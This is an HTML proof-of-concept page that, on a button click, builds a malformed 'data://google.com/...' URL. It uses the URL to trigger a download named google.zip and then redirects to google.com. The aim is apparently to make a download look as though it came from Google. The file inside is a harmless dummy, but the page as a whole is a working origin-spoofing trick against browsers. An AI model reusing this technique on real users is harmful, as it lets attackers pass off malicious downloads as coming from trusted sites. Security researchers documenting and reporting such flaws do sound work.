<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ZIP Download with Origin PoC</title>
</head>
<body>

<h3>ZIP Download with Spoofed Origin</h3>
<button id="start">Start</button>

<script>
document.getElementById('start').addEventListener('click', () => {
  try {
    // small base64 dummy
    const content = "PK\nFake ZIP\nHello Android\nEND";
    const base64 = btoa(content);

    // ⚠️ key: malformed URL trick
    const payload = "data://google.com/application/zip;base64," + base64;

    // trigger download
    const a = document.createElement('a');
    a.href = payload;
    a.download = "google.zip";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    console.log("ZIP download triggered with spoofed origin");

    // redirect after download
    setTimeout(() => {
      location.href = "https://google.com";
    }, 500);

  } catch(e) {
    console.error(e);
  }
});
</script>

</body>
</html>
